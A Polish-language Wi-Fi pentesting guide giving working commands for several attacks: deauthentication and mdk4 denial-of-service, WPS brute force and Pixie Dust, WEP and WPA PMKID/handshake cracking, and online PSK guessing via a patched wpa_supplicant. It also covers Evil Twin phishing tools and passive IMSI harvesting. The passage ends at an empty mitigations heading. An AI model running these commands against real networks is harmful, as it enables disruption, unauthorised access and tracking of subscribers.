# Pentesting Wifi

{{#include ../../banners/hacktricks-training.md}}

## Podstawowe polecenia Wifi
```bash
ip link show #List available interfaces
iwconfig #List available interfaces
airmon-ng check kill #Kill annoying processes
airmon-ng start wlan0 #Monitor mode
airmon-ng stop wlan0mon #Managed mode
airodump-ng wlan0mon #Scan (default 2.4Ghz)
airodump-ng wlan0mon --band a #Scan 5Ghz
airodump-ng wlan0mon --wps #Scan WPS
iwconfig wlan0 mode monitor #Put in mode monitor
iwconfig wlan0mon mode managed #Quit mode monitor - managed mode
iw dev wlan0 scan | grep "^BSS\|SSID\|WSP\|Authentication\|WPS\|WPA" #Scan available wifis
iwlist wlan0 scan #Scan available wifis
```
## Narzędzia

### Hijacker & NexMon (wewnętrzne Wi-Fi w Androidzie)


{{#ref}}
enable-nexmon-monitor-and-injection-on-android.md
{{#endref}}

### EAPHammer
```
git clone https://github.com/s0lst1c3/eaphammer.git
./kali-setup
```
### Airgeddon
```bash
mv `which dhcpd` `which dhcpd`.old
apt install isc-dhcp-server
apt-get install sslstrip asleap bettercap mdk4 hostapd beef-xss lighttpd dsniff hostapd-wpe
```
**Uruchom airgeddon przy użyciu docker**
```bash
docker run \
--rm \
-ti \
--name airgeddon \
--net=host \
--privileged \
-p 3000:3000 \
-v /tmp:/io \
-e DISPLAY=$(env | grep DISPLAY | awk -F "=" '{print $2}') \
v1s1t0r1sh3r3/airgeddon
```
From: [https://github.com/v1s1t0r1sh3r3/airgeddon/wiki/Docker%20Linux](https://github.com/v1s1t0r1sh3r3/airgeddon/wiki/Docker%20Linux)

### wifiphisher

Potrafi przeprowadzać ataki Evil Twin, KARMA i Known Beacons, a następnie użyć phishing template, aby uzyskać rzeczywiste network password lub przechwycić social network credentials.
```bash
git clone https://github.com/wifiphisher/wifiphisher.git # Download the latest revision
cd wifiphisher # Switch to tool's directory
sudo python setup.py install # Install any dependencies
```
### [Wifite2](https://github.com/derv82/wifite2)

To narzędzie automatyzuje **WPS/WEP/WPA-PSK** ataki. Automatycznie:

- Ustawi interfejs w monitor mode
- Zeskanuje możliwe sieci i pozwoli Ci wybrać cel(e)
- Jeśli WEP - uruchomi WEP attacks
- Jeśli WPA-PSK
- Jeśli WPS: Pixie dust attack i the bruteforce attack (uważaj — the brute-force attack może zająć dużo czasu). Uwaga: nie próbuje null PIN ani database/generated PINs.
- Próbuje przechwycić PMKID z AP, aby go złamać
- Próbuje deauthenticate klientów AP, aby przechwycić handshake
- Jeśli PMKID lub Handshake, próbuje bruteforce używając top5000 haseł.

## Attacks Summary

- **DoS**
- Deauthentication/disassociation -- Rozłączy wszystkich (lub konkretny ESSID/Client)
- Random fake APs -- Ukrywa sieci, possible crash scanners
- Overload AP -- Próbuje unieruchomić AP (zwykle niezbyt przydatne)
- WIDS -- Eksperymenty z IDS
- TKIP, EAPOL -- Niektóre specyficzne ataki DoS przeciw pewnym AP
- **Cracking**
- Crack **WEP** (kilka narzędzi i metod)
- **WPA-PSK**
- **WPS** pin "Brute-Force"
- **WPA PMKID** bruteforce
- \[DoS +] **WPA handshake** capture + Cracking
- **WPA-MGT**
- **Username capture**
- **Bruteforce** Credentials
- **Evil Twin** (with or without DoS)
- **Open** Evil Twin \[+ DoS] -- Przydatne do capture captive portal creds i/lub przeprowadzania ataków LAN
- **WPA-PSK** Evil Twin -- Przydatne do ataków sieciowych jeśli znasz hasło
- **WPA-MGT** -- Przydatne do capture company credentials
- **KARMA, MANA**, **Loud MANA**, **Known beacon**
- **+ Open** -- Przydatne do capture captive portal creds i/lub przeprowadzania ataków LAN
- **+ WPA** -- Przydatne do capture WPA handshakes

## Open / OWE networks quick notes

- **Passive capture** on open SSIDs still works with monitor mode and tcpdump:
```bash
iw wlan0 set type monitor
ip link set wlan0 up
iw wlan0 set channel 6
tcpdump -i wlan0 -w capture.pcap
```
- **OWE** (Opportunistic Wireless Encryption) wykonuje wymianę klucza dla każdej stacji (bez PSK), więc ramki radiowe są szyfrowane nawet na "open" SSID. Ponieważ opiera się na WPA3, wymusza też **802.11w PMF**, które blokuje sfałszowane deauth/disassoc frames.
- OWE **nie uwierzytelnia** dołączających: każdy może się skojarzyć, więc **zweryfikuj izolację klientów** zamiast ufać zapewnieniom marketingowym. Bez izolacji ARP spoofing lub responder-style poisoning na lokalnym L2 nadal działa.
- **Evil Twin** pozostaje wykonalny na open/OWE SSID poprzez nadanie silniejszego sygnału; PMF jedynie usuwa skrót deauth. Jeśli ofiary zaakceptują sfałszowany certyfikat TLS, pełny HTTP(S) MitM zostaje przywrócony.
- Broadcast poisoning na otwartym guest Wi‑Fi łatwo ujawnia creds/hashes (LLMNR/NBT-NS/mDNS). Zobacz:

{{#ref}}
../pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

## DOS

### Deauthentication Packets

**Opis z** [**here**:](https://null-byte.wonderhowto.com/how-to/use-mdk3-for-advanced-wi-fi-jamming-0185832/)**.**

**Deauthentication** attacks, a prevalent method in Wi‑Fi hacking, involve forging "management" frames to **wymuszone rozłączenie urządzeń z sieci**. These unencrypted packets deceive clients into believing they are from the legitimate network, enabling attackers to collect WPA handshakes for cracking purposes or to persistently disrupt network connections. This tactic, alarming in its simplicity, is widely used and has significant implications for network security.

**Deauthentication using Aireplay-ng**
```
aireplay-ng -0 0 -a 00:14:6C:7E:40:80 -c 00:0F:B5:34:30:30 ath0
```
- -0 oznacza deauthentication
- 1 oznacza liczbę deauths do wysłania (możesz wysłać wiele, jeśli chcesz); 0 oznacza wysyłać je ciągle
- -a 00:14:6C:7E:40:80 to adres MAC access point
- -c 00:0F:B5:34:30:30 to adres MAC klienta do deauthenticate; jeśli to zostanie pominięte, wysyłana jest broadcast deauthentication (nie zawsze działa)
- ath0 to nazwa interfejsu

### Disassociation Packets

**Disassociation packets**, podobnie jak deauthentication packets, są rodzajem management frame używanych w sieciach Wi-Fi. Te pakiety służą do zerwania połączenia między urządzeniem (takim jak laptop lub smartphone) a access point (AP). Główna różnica między disassociation a deauthentication leży w ich scenariuszach użycia. Podczas gdy AP wysyła **deauthentication packets to remove rogue devices explicitly from the network, disassociation packets are typically sent when the AP is undergoing a shutdown**, restart lub przenoszeniu, co zmusza do rozłączenia wszystkich podłączonych węzłów.

**Ten atak można wykonać za pomocą mdk4(mode "d"):**
```bash
# -c <channel>
# -b victim_client_mac.txt contains the MAC address of the device to eliminate
# -e WifiName is the name of the wifi
# -B BSSID is the BSSID of the AP
# Notice that these and other parameters aare optional, you could give onli the ESSID and md4k will automatically search for it, wait for finding clients and deauthenticate them
mdk4 wlan0mon d -c 5 -b victim_client_mac.txt -E WifiName -B EF:60:69:D7:69:2F
```
### **Więcej ataków DOS przez mdk4**

**W** [**tutaj**](https://en.kali.tools/?p=864)**.**

**ATTACK MODE b: Beacon Flooding**

Wysyła ramki beacon, aby pokazać klientom fałszywe APy. To czasami może spowodować awarię skanerów sieciowych, a nawet sterowników!
```bash
# -a Use also non-printable caracters in generated SSIDs and create SSIDs that break the 32-byte limit
# -w n (create Open) t (Create WPA/TKIP) a (Create WPA2/AES)
# -m use real BSSIDS
# All the parameters are optional and you could load ESSIDs from a file
mdk4 wlan0mon b -a -w nta -m
```
**ATTACK MODE a: Authentication Denial-Of-Service**

Wysyłanie authentication frames do wszystkich dostępnych Access Points (APs) w zasięgu może przeciążyć te APs, zwłaszcza gdy zaangażowanych jest wielu clients. Ten intensywny ruch może prowadzić do niestabilności systemu, powodując, że niektóre APs zawieszają się lub nawet resetują.
```bash
# -a BSSID send random data from random clients to try the DoS
# -i BSSID capture and repeat pakets from authenticated clients
# -m use real MACs
# only -a or -i can be used
mdk4 wlan0mon a [-i EF:60:69:D7:69:2F] [-a EF:60:69:D7:69:2F] -m
```
**ATTACK MODE p: SSID Probing and Bruteforcing**

Probing Access Points (APs) sprawdza, czy SSID jest poprawnie ujawniony i potwierdza zasięg AP. Ta technika, w połączeniu z **bruteforcing hidden SSIDs** z użyciem lub bez wordlist, pomaga w identyfikacji i dostępie do ukrytych sieci.

**ATTACK MODE m: Michael Countermeasures Exploitation**

Wysyłanie losowych lub zduplikowanych pakietów do różnych kolejek QoS może wywołać Michael Countermeasures na **TKIP APs**, prowadząc do jednominutowego wyłączenia AP. Ta metoda jest efektywną taktyką ataku **DoS** (Denial of Service).
```bash
# -t <BSSID> of a TKIP AP
# -j use inteligent replay to create the DoS
mdk4 wlan0mon m -t EF:60:69:D7:69:2F [-j]
```
**ATTACK MODE e: EAPOL Start and Logoff Packet Injection**

Zalewanie AP za pomocą **EAPOL Start frames** tworzy **fałszywe sesje**, przeciążając AP i blokując prawowitych klientów. Alternatywnie, wstrzyknięcie **fake EAPOL Logoff messages** wymusza rozłączenie klientów — obie metody skutecznie zakłócają działanie sieci.
```bash
# Use Logoff messages to kick clients
mdk4 wlan0mon e -t EF:60:69:D7:69:2F [-l]
```
**ATTACK MODE s: Ataki na sieci mesh IEEE 802.11s**

Różne ataki na zarządzanie łączami i routing w sieciach mesh.

**ATTACK MODE w: WIDS Confusion**

Krzyżowe łączenie klientów z wieloma węzłami WDS lub fałszywymi rogue APs może manipulować działaniem Intrusion Detection and Prevention Systems, powodując zamieszanie i umożliwiając potencjalne nadużycia systemu.
```bash
# -z activate Zero_Chaos' WIDS exploit (authenticates clients from a WDS to foreign APs to make WIDS go nuts)
mkd4 -e <SSID> -c <channel> [-z]
```
**ATTACK MODE f: Packet Fuzzer**

Packet fuzzer oferujący różnorodne źródła pakietów i kompleksowy zestaw modyfikatorów do manipulacji pakietami.

### **Airggedon**

_**Airgeddon**_ oferuje większość ataków zaproponowanych we wcześniejszych komentarzach:

![](<../../images/image (95).png>)

## WPS

WPS (Wi-Fi Protected Setup) upraszcza proces łączenia urządzeń z routerem, przyspieszając i ułatwiając konfigurację dla sieci szyfrowanych za pomocą **WPA** lub **WPA2** Personal. Jest nieskuteczny wobec łatwo łamanej ochrony WEP. WPS używa 8-cyfrowego PINu, weryfikowanego w dwóch częściach, co czyni go podatnym na ataki brute-force z powodu ograniczonej liczby kombinacji (około 11 000 możliwości).

### WPS Bruteforce

Są 2 główne narzędzia do wykonania tego ataku: Reaver i Bully.

- **Reaver** został zaprojektowany jako solidny i praktyczny atak przeciw WPS i był testowany na szerokiej gamie access points i implementacji WPS.
- **Bully** to **nowa implementacja** ataku brute force na WPS, napisana w C. Ma kilka zalet w porównaniu z oryginalnym kodem reaver: mniej dependencies, lepsza wydajność pamięci i cpu, poprawne obsługiwanie endianness oraz bardziej rozbudowany zestaw opcji.

Atak wykorzystuje podatność **WPS PIN**, w szczególności ujawnienie pierwszych czterech cyfr i rolę ostatniej cyfry jako sumy kontrolnej, co ułatwia atak brute-force. Jednak obrony przed atakami brute-force, takie jak **blokowanie adresów MAC** agresywnych atakujących, wymagają **rotacji adresu MAC**, aby kontynuować atak.

Po uzyskaniu WPS PIN za pomocą narzędzi takich jak Bully lub Reaver, atakujący może odtworzyć WPA/WPA2 PSK, zapewniając **stały dostęp do sieci**.
```bash
reaver -i wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -b -f -N [-L -d 2] -vvroot
bully wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -S -F -B -v 3
```
**Smart Brute Force**

To udoskonalone podejście celuje w WPS PINs, wykorzystując znane podatności:

1. **Pre-discovered PINs**: Wykorzystuje bazę danych znanych PINs powiązaną z konkretnymi producentami, którzy zwykle używają jednakowych WPS PINs. Baza ta koreluje pierwsze trzy oktety MAC-addresses z prawdopodobnymi PINs dla tych producentów.
2. **PIN Generation Algorithms**: Wykorzystuje algorytmy takie jak ComputePIN i EasyBox, które obliczają WPS PINs na podstawie MAC-address AP-a. Algorytm Arcadyan dodatkowo wymaga device ID, dodając warstwę do procesu generowania PINs.

### WPS Pixie Dust attack

**Dominique Bongard** odkrył błąd w niektórych Access Points (APs) dotyczący tworzenia tajnych kodów, znanych jako **nonces** (**E-S1** i **E-S2**). Jeśli te nonces można odgadnąć, cracking WPS PIN AP-a staje się prosty. AP ujawnia PIN w specjalnym kodzie (hash), by udowodnić, że jest autentyczny, a nie fake (rogue) AP. Te nonces są w istocie "kluczami" do odblokowania "sejfu", który przechowuje WPS PIN. Więcej na ten temat można znaleźć [here](<https://forums.kali.org/showthread.php?24286-WPS-Pixie-Dust-Attack-(Offline-WPS-Attack)>).

W prostych słowach problem polega na tym, że niektóre APs nie używały wystarczająco losowych kluczy do szyfrowania PIN podczas procesu łączenia. To sprawia, że PIN jest podatny na odgadnięcie z zewnątrz sieci (offline brute force attack).
```bash
reaver -i wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -K 1 -N -vv
bully  wlan1mon -b 00:C0:CA:78:B1:37 -d -v 3
```
Jeśli nie chcesz przełączać urządzenia w monitor mode albo `reaver` i `bully` sprawiają problemy, możesz spróbować [OneShot-C](https://github.com/nikita-yfh/OneShot-C). To narzędzie potrafi przeprowadzić Pixie Dust attack bez konieczności przełączania w monitor mode.
```bash
./oneshot -i wlan0 -K -b 00:C0:CA:78:B1:37
```
### Null Pin attack

Niektóre słabo zaprojektowane systemy pozwalają nawet, aby **Null PIN** (pusty lub nieistniejący PIN) umożliwiał dostęp, co jest dość nietypowe. Narzędzie **Reaver** potrafi testować tę podatność, w przeciwieństwie do **Bully**.
```bash
reaver -i wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -f -N -g 1 -vv -p ''
```
### Airgeddon

Wszystkie proponowane ataki WPS można łatwo przeprowadzić za pomocą _**airgeddon.**_

![](<../../images/image (219).png>)

- 5 i 6 pozwalają wypróbować **własny PIN** (jeśli go masz)
- 7 i 8 wykonują **Pixie Dust attack**
- 13 pozwala przetestować **NULL PIN**
- 11 i 12 będą **odtwarzać PINy powiązane z wybranym AP z dostępnych baz danych** i **generować** możliwe **PINy** używając: ComputePIN, EasyBox i opcjonalnie Arcadyan (zalecane, czemu nie?)
- 9 i 10 przetestują **wszystkie możliwe PINy**

## **WEP**

**Dlaczego się łamie**

- Ziarno RC4 to po prostu **IV (24 bits) + shared key**. IV jest jawny, niewielki (2^24) i szybko się powtarza, więc ciphertexts z tym samym IV ponownie używają keystreamu.
- XORing dwóch ciphertexts z tym samym keystreamem leaks `PlaintextA ⊕ PlaintextB`; przewidywalne nagłówki + RC4 KSA biases (**FMS**) pozwalają „vote” bajtom klucza. **PTW** optymalizuje to, wykorzystując ARP traffic, aby zmniejszyć wymagania do dziesiątek tysięcy packets zamiast milionów.
- Integralność jest zapewniona tylko przez **CRC32** (linear/unkeyed), więc attacker może flipować bity i przeliczyć CRC32 bez klucza → packet forgery/replay/ARP injection podczas oczekiwania na IVs.

Praktyczne złamanie jest deterministyczne:
```bash
airodump-ng --bssid <BSSID> --channel <ch> --write wep_capture wlan1mon  # collect IVs
# optionally speed up IVs without deauth by replaying ARP
aireplay-ng --arpreplay -b <BSSID> -h <clientMAC> wlan1mon
aircrack-ng wep_capture-01.cap  # PTW attack recovers key once IV threshold is met
```
Airgeddon nadal udostępnia "All-in-One" WEP workflow, jeśli wolisz prowadzone UI.

![](<../../images/image (432).png>)

---

---

## WPA/WPA2 PSK

### PMKID

W 2018 roku **hashcat** [revealed](https://hashcat.net/forum/thread-7717.html) nową metodę ataku, wyjątkową ponieważ wymaga tylko **jednego pakietu** i nie wymaga, aby jakiekolwiek klienty były podłączone do docelowego AP — wystarczy interakcja między atakującym a AP.

Wiele nowoczesnych routerów dodaje **opcjonalne pole** do **pierwszej ramki EAPOL** podczas łączenia, znane jako `Robust Security Network`. Zawiera ono `PMKID`.

Jak wyjaśnia oryginalny post, **PMKID** jest tworzony przy użyciu znanych danych:
```bash
PMKID = HMAC-SHA1-128(PMK, "PMK Name" | MAC_AP | MAC_STA)
```
Ponieważ "PMK Name" jest stały, znamy BSSID AP i stacji, a `PMK` jest identyczny z tym z pełnego 4-way handshake, **hashcat** może użyć tych informacji, aby crack the PSK i recover the passphrase!

Aby **zebrać** te informacje i lokalnie **bruteforce** hasło, możesz wykonać:
```bash
airmon-ng check kill
airmon-ng start wlan0
git clone https://github.com/ZerBea/hcxdumptool.git; cd hcxdumptool; make; make install
hcxdumptool -o /tmp/attack.pcap -i wlan0mon --enable_status=1
```

```bash
#You can also obtains PMKIDs using eaphammer
./eaphammer --pmkid --interface wlan0 --channel 11 --bssid 70:4C:A5:F8:9A:C1
```
**PMKIDs captured** zostaną pokazane w **console** i także **zapisane** w \_ **/tmp/attack.pcap**\_\
Teraz przekonwertuj zrzut do formatu **hashcat/john** i crack it:
```bash
hcxtools/hcxpcaptool -z hashes.txt /tmp/attack.pcapng
hashcat -m 16800 --force hashes.txt /usr/share/wordlists/rockyou.txt
john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
```
Zwróć uwagę, że format poprawnego hash zawiera **4 części**, np.: `4017733ca8db33a1479196c2415173beb808d7b83cfaa4a6a9a5aae7566f6461666f6e65436f6e6e6563743034383131343838` Jeśli Twój **tylko** zawiera **3 części**, to jest on **nieprawidłowy** (przechwytanie PMKID nie było prawidłowe).

Zauważ, że `hcxdumptool` **również przechwytuje handshakes** (pojawi się coś takiego: **`MP:M1M2 RC:63258 EAPOLTIME:17091`**). Możesz **przekonwertować** **handshakes** do formatu **hashcat**/**john** używając `cap2hccapx`
```bash
tcpdump -r /tmp/attack.pcapng -w /tmp/att.pcap
cap2hccapx pmkid.pcapng pmkid.hccapx ["Filter_ESSID"]
hccap2john pmkid.hccapx > handshake.john
john handshake.john --wordlist=/usr/share/wordlists/rockyou.txt
aircrack-ng /tmp/att.pcap -w /usr/share/wordlists/rockyou.txt #Sometimes
```
_Zauważyłem, że niektóre handshakes przechwycone tym narzędziem nie mogły zostać cracked nawet przy znanym prawidłowym password. Zalecam przechwytywać handshakes także tradycyjnymi metodami, jeśli to możliwe, lub złapać kilka z nich przy użyciu tego narzędzia._

### Handshake capture

Atak na sieci **WPA/WPA2** można przeprowadzić poprzez przechwycenie **handshake** i próbę **crack** password **offline**. Proces ten polega na monitorowaniu komunikacji konkretnej sieci i **BSSID** na danym **channel**. Oto uproszczony przewodnik:

1. Zidentyfikuj **BSSID**, **channel**, oraz **connected client** sieci docelowej.
2. Użyj `airodump-ng` do monitorowania ruchu sieciowego na wskazanym channel i BSSID, mając nadzieję na przechwycenie handshake. Polecenie będzie wyglądać tak:
```bash
airodump-ng wlan0 -c 6 --bssid 64:20:9F:15:4F:D7 -w /tmp/psk --output-format pcap
```
3. Aby zwiększyć szansę na przechwycenie handshake, chwilowo rozłącz klienta z sieci, aby wymusić ponowne uwierzytelnienie. Można to zrobić za pomocą polecenia `aireplay-ng`, które wysyła deauthentication packets do klienta:
```bash
aireplay-ng -0 0 -a 64:20:9F:15:4F:D7 wlan0 #Send generic deauth packets, may not work in all scenarios
```
_Zauważ, że ponieważ client został deauthenticated, może spróbować połączyć się z innym AP lub — w innych przypadkach — z innym network._

Gdy w `airodump-ng` pojawią się informacje o handshake, oznacza to, że handshake został przechwycony i możesz przestać nasłuchiwać:

![](<../../images/image (172) (1).png>)

Po przechwyceniu handshake możesz go **crack** za pomocą `aircrack-ng`:
```
aircrack-ng -w /usr/share/wordlists/rockyou.txt -b 64:20:9F:15:4F:D7 /tmp/psk*.cap
```
### Sprawdź, czy plik zawiera handshake

**aircrack**
```bash
aircrack-ng psk-01.cap #Search your bssid/essid and check if any handshake was capture
```
**tshark**
```bash
tshark -r psk-01.cap -n -Y eapol #Filter handshake messages #You should have the 4 messages.
```
[**cowpatty**](https://github.com/roobixx/cowpatty)
```
cowpatty -r psk-01.cap -s "ESSID" -f -
```
_Jeśli to narzędzie znajdzie nieukończony handshake dla ESSID zanim znajdzie ukończony, nie wykryje prawidłowego._

**pyrit**
```bash
apt-get install pyrit #Not working for newer versions of kali
pyrit -r psk-01.cap analyze
```
#### Szybsze zgadywanie PSK online przez `wpa_supplicant` ctrl socket (bez klientów/PMKID)

Gdy nie ma klientów w pobliżu, a AP odrzuca PMKID, możesz iterować PSK online bez ponownego uruchamiania supplicants:

- Zmień `wpa_supplicant.c`, aby wymusić `dur = 0;` w logice backoff po błędzie uwierzytelniania (w okolicy `ssid->auth_failures`), skutecznie wyłączając timer temporary-disable.
- Uruchom pojedynczego daemona z control socket:
```bash
# wpa_supplicant.conf
ctrl_interface=DIR=/var/run/wpa_supplicant GROUP=root
update_config=1

wpa_supplicant -B -i wlp3s0 -c wpa_supplicant.conf
```
- Steruj nim przez interfejs kontrolny, ponownie używając tego samego skanu i sieci:
```text
ADD_NETWORK
SET_NETWORK 0 ssid "<ssid>"
ENABLE_NETWORK 0
SCAN
(loop)
SET_NETWORK 0 psk "<candidate>"
REASSOCIATE
wait for CTRL-EVENT-CONNECTED / DISCONNECTED
```
Mała pętla w Pythonie odczytująca zdarzenia z gniazda (`CTRL-EVENT-CONNECTED` / `CTRL-EVENT-DISCONNECTED`) może przetestować ~100 prób w ~5 minut bez narzutu skanowania. Nadal jest to hałaśliwe i wykrywalne, ale unika ponownego uruchamiania procesu przy każdej próbie i opóźnień backoff.

## **WPA Enterprise (MGT)**

W **sieciach WiFi typu enterprise napotkasz różne metody uwierzytelniania**, z których każda oferuje różne poziomy bezpieczeństwa i funkcje zarządzania. Gdy użyjesz narzędzi takich jak `airodump-ng` do analizy ruchu sieciowego, możesz zauważyć identyfikatory tych typów uwierzytelniania. Do powszechnie spotykanych metod należą:
```
6A:FE:3B:73:18:FB  -58       19        0    0   1  195  WPA2 CCMP   MGT  NameOfMyWifi
```
1. **EAP-GTC (Generic Token Card)**:
- Ta metoda obsługuje tokeny sprzętowe i hasła jednorazowe w ramach EAP-PEAP. W przeciwieństwie do MSCHAPv2 nie używa peer challenge i wysyła hasła w tekście jawnym do access pointa, co stwarza ryzyko dla downgrade attacks.
2. **EAP-MD5 (Message Digest 5)**:
- Polega na wysłaniu skrótu MD5 hasła przez klienta. Nie jest **zalecany** z powodu podatności na ataki słownikowe, braku uwierzytelniania serwera i niemożności wygenerowania sesyjnych kluczy WEP specyficznych dla sesji.
3. **EAP-TLS (Transport Layer Security)**:
- Wykorzystuje certyfikaty po stronie klienta i serwera do uwierzytelniania i może dynamicznie generować klucze WEP oparte na użytkowniku i sesji do zabezpieczenia komunikacji.
4. **EAP-TTLS (Tunneled Transport Layer Security)**:
- Zapewnia wzajemne uwierzytelnianie poprzez zaszyfrowany tunel oraz metodę do wyprowadzenia dynamicznych, per-user, per-session kluczy WEP. Wymaga tylko certyfikatów po stronie serwera; klienci używają poświadczeń.
5. **PEAP (Protected Extensible Authentication Protocol)**:
- Działa podobnie do EAP, tworząc TLS tunnel dla chronionej komunikacji. Pozwala na użycie słabszych protokołów uwierzytelniania nad EAP dzięki ochronie zapewnianej przez tunel.
- **PEAP-MSCHAPv2**: Często określane jako PEAP, łączy podatny mechanizm challenge/response MSCHAPv2 z ochronnym TLS tunnel.
- **PEAP-EAP-TLS (or PEAP-TLS)**: Podobne do EAP-TLS, ale inicjuje TLS tunnel przed wymianą certyfikatów, oferując dodatkową warstwę bezpieczeństwa.

You can find more information about these authentication methods [here ](https://en.wikipedia.org/wiki/Extensible_Authentication_Protocol)and [here](https://www.intel.com/content/www/us/en/support/articles/000006999/network-and-i-o/wireless-networking.html).

### Przechwytywanie nazwy użytkownika

Czytając [https://tools.ietf.org/html/rfc3748#page-27](https://tools.ietf.org/html/rfc3748#page-27) wygląda na to, że jeśli używasz **EAP** to **"Identity"** **messages** muszą być **supported**, a **nazwa użytkownika** zostanie wysłana w **clear** w **"Response Identity"** messages.

Nawet używając jednej z najbezpieczniejszych metod uwierzytelniania: **PEAP-EAP-TLS**, możliwe jest **przechwycenie nazwy użytkownika wysyłanej w protokole EAP**. Aby to zrobić, **przechwyć komunikację uwierzytelniającą** (uruchom `airodump-ng` na kanale i `wireshark` na tym samym interfejsie) i przefiltruj pakiety po `eapol`.\
Wewnątrz pakietu "**Response, Identity**" pojawi się **nazwa użytkownika** klienta.

![](<../../images/image (850).png>)

### Tożsamości anonimowe

Ukrywanie tożsamości jest obsługiwane zarówno przez EAP-PEAP, jak i EAP-TTLS. W kontekście sieci WiFi żądanie EAP-Identity jest zazwyczaj inicjowane przez access point (AP) podczas procesu asocjacji. Aby zapewnić ochronę anonimowości użytkownika, odpowiedź klienta EAP na urządzeniu użytkownika zawiera tylko niezbędne informacje wymagane do przetworzenia żądania przez początkowy serwer RADIUS. Koncepcję tę ilustrują następujące scenariusze:

- EAP-Identity = anonymous
- W tym scenariuszu wszyscy użytkownicy używają pseudonimu "anonymous" jako swojego identyfikatora użytkownika. Początkowy serwer RADIUS działa jako serwer EAP-PEAP lub EAP-TTLS, odpowiedzialny za obsługę strony serwerowej protokołu PEAP lub TTLS. Wewnętrzna (chroniona) metoda uwierzytelniania jest następnie obsługiwana lokalnie lub delegowana do zdalnego (home) serwera RADIUS.
- EAP-Identity = anonymous@realm_x
- W tej sytuacji użytkownicy z różnych realmów ukrywają swoje tożsamości, jednocześnie wskazując swoje odpowiednie realm. Pozwala to początkowemu serwerowi RADIUS na proxy-owanie żądań EAP-PEAP lub EAP-TTLS do serwerów RADIUS w ich home realm, które działają jako serwer PEAP lub TTLS. Początkowy serwer RADIUS działa wyłącznie jako węzeł przekaźnikowy RADIUS.
- Alternatywnie początkowy serwer RADIUS może funkcjonować jako serwer EAP-PEAP lub EAP-TTLS i albo obsługiwać chronioną metodę uwierzytelniania, albo przekazać ją innemu serwerowi. Opcja ta umożliwia skonfigurowanie różnych polityk dla różnych realmów.

W EAP-PEAP, gdy tunel TLS zostanie ustanowiony między PEAP server a PEAP client, PEAP server inicjuje żądanie EAP-Identity i przesyła je przez TLS tunnel. Klient odpowiada na to drugie żądanie EAP-Identity wysyłając EAP-Identity response zawierający prawdziwą tożsamość użytkownika przez zaszyfrowany tunel. Podejście to skutecznie zapobiega ujawnieniu prawdziwej tożsamości użytkownika komukolwiek podsłuchującemu ruch 802.11.

EAP-TTLS postępuje nieco inaczej. W EAP-TTLS klient zazwyczaj uwierzytelnia się przy użyciu PAP lub CHAP, zabezpieczonych przez TLS tunnel. W takim przypadku klient dołącza atrybut User-Name oraz albo Password albo CHAP-Password w początkowej wiadomości TLS wysyłanej po ustanowieniu tunelu.

Bez względu na wybrany protokół, serwer PEAP/TTLS uzyskuje znajomość prawdziwej tożsamości użytkownika po ustanowieniu TLS tunnel. Prawdziwa tożsamość może być reprezentowana jako user@realm lub po prostu user. Jeśli serwer PEAP/TTLS jest również odpowiedzialny za uwierzytelnianie użytkownika, to teraz posiada jego tożsamość i przechodzi do metody uwierzytelniania chronionej przez TLS tunnel. Alternatywnie serwer PEAP/TTLS może przekazać nowe żądanie RADIUS do home serwera RADIUS użytkownika. To nowe żądanie RADIUS pomija warstwę protokołu PEAP lub TTLS. W przypadkach gdy chroniona metoda uwierzytelniania to EAP, wewnętrzne wiadomości EAP są przesyłane do home serwera RADIUS bez opakowania EAP-PEAP lub EAP-TTLS. Atrybut User-Name w wychodzącej wiadomości RADIUS zawiera prawdziwą tożsamość użytkownika, zastępując anonimowy User-Name z przychodzącego żądania RADIUS. Gdy chroniona metoda uwierzytelniania to PAP lub CHAP (obsługiwane tylko przez TTLS), atrybuty User-Name oraz inne atrybuty uwierzytelniania wyciągnięte z ładunku TLS są podstawiane w wychodzącej wiadomości RADIUS, wypierając anonimowy User-Name i TTLS EAP-Message atrybuty znalezione w przychodzącym żądaniu RADIUS.

For more info check [https://www.interlinknetworks.com/app_notes/eap-peap.htm](https://www.interlinknetworks.com/app_notes/eap-peap.htm)

### SIM-based EAP (EAP-SIM/EAP-AKA) identity leakage (IMSI exposure)

SIM-based Wi‑Fi authentication using EAP‑SIM/EAP‑AKA over 802.1X can leak the permanent subscriber identifier (IMSI) in cleartext during the unauthenticated identity phase if the deployment doesn’t implement pseudonyms/protected identities or a TLS tunnel around the inner EAP.

Where the leak happens (high level):
- 802.11 association completes to the SSID (often carrier offload SSIDs like FreeWifi_secure, eduroam-like operator realms, etc.).
- Authenticator sends EAP-Request/Identity.
- Vulnerable clients answer EAP-Response/Identity with their permanent identity = IMSI encoded as a 3GPP NAI, prior to any protection.
- Example NAI: 20815XXXXXXXXXX@wlan.mnc015.mcc208.3gppnetwork.org
- Anyone passively listening to RF can read that frame. No 4-way handshake or TLS keying is needed.

Quick PoC: passive IMSI harvesting on EAP‑SIM/AKA networks lacking identity privacy
<details>
<summary>Kliknij, aby rozwinąć</summary>
```bash
# 1) Enable monitor mode
airmon-ng start wlan0

# 2) Optional: lock channel to the target BSS
airodump-ng wlan0mon --essid <SSID>

# 3) Capture 802.1X/EAP frames
# Wireshark display filters:
#   eap || eapol
#   (identity specifically): eap.code == 2 && eap.type == 1
# Kismet: add source wlan0mon; enable 802.1X/EAP views
# tcpdump (pcap capture):
#   tcpdump -i wlan0mon -s 0 -w eapsim_identity.pcap

# 4) Wait for a device to auto-connect to the SSID
# 5) Inspect the first EAP-Response/Identity frame
# Expected: ASCII NAI containing IMSI, e.g.
#   20815XXXXXXXXXX@wlan.mnc015.mcc208.3gppnetwork.org
```
</details>

Uwagi:
- Działa przed nawiązaniem jakiegokolwiek tunelu TLS, jeśli wdrożenie używa gołego EAP‑SIM/AKA bez chronionej tożsamości/pseudonimów.
- Ujawniona wartość jest trwałym identyfikatorem powiązanym z SIM abonenta; zebranie umożliwia długoterminowe śledzenie i dalsze nadużycia w telekomunikacji.

Wpływ
- Prywatność: trwałe śledzenie użytkownika/urządzenia na podstawie pasywnych przechwyceń Wi‑Fi w miejscach publicznych.
- Otwarcie drogi do nadużyć telekomunikacyjnych: mając IMSI, atakujący z dostępem do SS7/Diameter może zapytać o lokalizację lub próbować przechwycić połączenia/SMS i wykraść MFA.

Mitigacje / na co zwrócić uwagę
